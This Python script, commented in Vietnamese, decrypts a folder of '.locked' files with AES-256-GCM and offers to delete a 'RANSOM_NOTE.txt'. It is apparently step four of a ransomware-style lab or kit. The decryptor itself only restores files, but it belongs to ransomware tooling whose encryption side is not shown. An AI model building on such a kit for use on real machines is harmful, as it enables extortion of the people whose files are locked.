"""
decrypt_AES.py  —  Giai ma thu muc (AES-256-GCM)
═══════════════════════════════════════════════════════
Logic:
  1. Chon file 'aes_key.pem' (khoa tran da duoc giai ma boi RSA)
  2. Chon thu muc chua cac file .locked
  3. Giai ma toan bo file trong thu muc
"""

import os
import sys
import base64
from pathlib import Path

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError:
    print("[!] Cai dat thu vien: pip install cryptography")
    sys.exit(1)

MAGIC       = b"AESCRYPT"
HEADER_SIZE = 8 + 12 + 16   # MAGIC + NONCE + TAG
W           = 60

# ── BROWSER (FILE & DIRECTORY) ─────────────────────────────

def _ls(path, ext=None):
    try: entries = os.listdir(path)
    except PermissionError: return [], []
    dirs  = sorted([e for e in entries if os.path.isdir(os.path.join(path,e))  and not e.startswith('.')], key=str.lower)
    files = sorted([e for e in entries if os.path.isfile(os.path.join(path,e)) and not e.startswith('.')], key=str.lower)
    if ext: files = [f for f in files if os.path.splitext(f)[1].lower() in ext]
    return dirs, files

def browse_file(title: str, start: str = None, ext=None):
    cur = os.path.abspath(start or os.getcwd())
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print("+" + "-"*W + "+")
        print(f"|  {title:<{W-2}}|")
        print("+" + "-"*W + "+")
        dirs, files = _ls(cur, ext)
        items = []
        if os.path.dirname(cur) != cur: items.append(("[DIR]  ..", os.path.dirname(cur), True))
        for d in dirs: items.append((f"[DIR]  {d}/", os.path.join(cur, d), True))
        for fn in files: items.append((f"[FILE] {fn}", os.path.join(cur, fn), False))
        for i,(label,_,_) in enumerate(items,1): print(f"|  {i:>3}.  {label:<{W-8}}|")
        print("+" + "-"*W + "+")
        c = input("\n  >>> Nhap so de chon (q=huy): ").strip().lower()
        if c == "q": return None
        if c.isdigit() and 1 <= int(c) <= len(items):
            _, fp, is_d = items[int(c)-1]
            if is_d: cur = fp
            else: return fp

def browse_directory(title: str, start: str = None):
    cur = os.path.abspath(start or os.getcwd())
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print("+" + "-"*W + "+")
        print(f"|  {title:<{W-2}}|")
        print(f"|  Thu muc: {cur[-45:]:<47}|")
        print("+" + "-"*W + "+")
        dirs, _ = _ls(cur)
        items = []
        if os.path.dirname(cur) != cur: items.append(("[DIR]  ..", os.path.dirname(cur)))
        for d in dirs: items.append((f"[DIR]  {d}/", os.path.join(cur, d)))
        for i,(label,_) in enumerate(items,1): print(f"|  {i:>3}.  {label:<{W-8}}|")
        print("+" + "-"*W + "+")
        c = input("\n  >>> So=di vao | s=CHON THU MUC NAY | q=huy: ").strip().lower()
        if c == "q": return None
        if c == "s": return cur
        if c.isdigit() and 1 <= int(c) <= len(items): cur = items[int(c)-1][1]

# ── CORE FUNCTIONS ─────────────────────────────

def load_raw_aes_key(pem_path: str) -> bytes:
    with open(pem_path, "r", encoding="utf-8") as f:
        content = f.read()
    begin = "-----BEGIN RAW AES KEY-----"
    end   = "-----END RAW AES KEY-----"
    if begin not in content or end not in content:
        raise ValueError("Khong phai file RAW AES KEY hop le.")
    b64_data = content.split(begin)[1].split(end)[0].strip()
    return base64.b64decode(b64_data)

def decrypt_locked_file(aes_key: bytes, locked_path: Path) -> bool:
    try:
        with open(locked_path, "rb") as f: data = f.read()
        if len(data) < HEADER_SIZE or data[:8] != MAGIC: return False
        
        nonce, tag, ct = data[8:20], data[20:36], data[36:]
        plaintext = AESGCM(aes_key).decrypt(nonce, ct + tag, None)

        original_path = locked_path.parent / locked_path.name[:-7]
        with open(original_path, "wb") as f: f.write(plaintext)
        os.remove(locked_path)
        return True
    except:
        return False

# ── MAIN ─────────────────────────────────────────────

def main():
    os.system("cls" if os.name == "nt" else "clear")
    print("=" * W)
    print("       BUOC 4: GIAI MA THU MUC (.locked) BANG AES")
    print("=" * W)

    print("\n[1] Chon file chua khoa AES (aes_key.pem)")
    input("  Nhan Enter de mo trinh duyet file...")
    aes_pem = browse_file("CHON FILE AES KEY (.pem)", ext=[".pem"])
    if not aes_pem: return

    try:
        aes_key = load_raw_aes_key(aes_pem)
        print(f"[OK] Da load AES key thanh cong!")
    except Exception as e:
        print(f"[X] Loi doc file key: {e}")
        return

    print("\n[2] Chon thu muc bi khoa (.locked)")
    input("  Nhan Enter de mo trinh duyet thu muc...")
    folder = browse_directory("CHON THU MUC BI KHOA (Nhan 's' de xac nhan)")
    if not folder: return

    locked_files = list(Path(folder).rglob("*.locked"))
    if not locked_files:
        print(f"\n[!] Khong co file .locked nao trong: {folder}")
        return

    print(f"\n  Tim thay {len(locked_files)} file(s).")
    confirm = input("  Nhap 'DECRYPT' de tien hanh: ").strip()
    if confirm != "DECRYPT": return

    print(f"\n[3] Dang giai ma {len(locked_files)} file(s)...")
    count = 0
    for locked_path in locked_files:
        if decrypt_locked_file(aes_key, locked_path):
            print(f"  [OK] Khoi phuc: {locked_path.name[:-7]}")
            count += 1

    aes_key = b'\x00' * len(aes_key)
    del aes_key

    print("\n" + "=" * W)
    print(f"  GIAI MA HOAN TAT! ({count}/{len(locked_files)} file thanh cong)")
    if count > 0:
        if input("  [?] Xoa RANSOM_NOTE.txt va file aes_key.pem? (y/n) [y]: ").strip().lower() in ("y", ""):
            note = os.path.join(folder, "RANSOM_NOTE.txt")
            if os.path.exists(note): os.remove(note)
            if os.path.exists(aes_pem): os.remove(aes_pem)
            print("  [OK] Da xoa file rac.")
    print("=" * W)

if __name__ == "__main__":
    main()
